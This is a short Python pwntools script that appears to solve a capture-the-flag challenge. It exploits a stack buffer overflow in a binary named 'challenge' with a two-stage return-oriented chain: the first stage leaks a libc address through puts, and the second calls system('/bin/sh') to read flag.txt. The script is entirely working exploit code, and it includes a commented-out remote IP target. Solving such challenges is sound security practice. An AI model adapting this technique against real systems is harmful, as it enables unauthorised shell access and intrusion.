from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
e = context.binary = ELF('./challenge')
lib = ELF('libc-2.23.so')

# r = e.process()
# r = remote("34.175.151.38" , 14014)
r = remote("localhost" , 14014)
pop_rdi_ret = 0x401383
ret = 0x40101a
setbuf_got = e.got["puts"]
puts_plt = 0x401090
main =  0x4011d6
rbp = 0x404f00
payload = b"a"*0x30+ flat(rbp, pop_rdi_ret, setbuf_got, puts_plt, main)
pause()
r.sendlineafter(b"name? \n",payload)
r.recvline()
r.sendlineafter(b"flag! \n",b"a")
r.recvline()
setbuf_libc = u64(r.recv(6).ljust(8,b"\x00")) 
log.info("setbuf_libc: %#x" %setbuf_libc)
base_libc = setbuf_libc - lib.sym.puts
system_libc = base_libc + lib.sym.system
binsh_libc = base_libc + next(lib.search(b"/bin/sh"))
log.info("base_libc: %#x" %base_libc)
log.info("system_libc: %#x" %system_libc)
log.info("binsh_libc: %#x" %binsh_libc)

payload = b"a"*0x30
payload+= flat(rbp,ret, pop_rdi_ret, binsh_libc, system_libc, main)
pause()
r.sendlineafter(b"name? \n",payload)

r.recvline()
pause()
r.sendlineafter(b"flag! \n",b"a")

r.sendline(b"cat flag.txt")
# pause()

r.interactive()
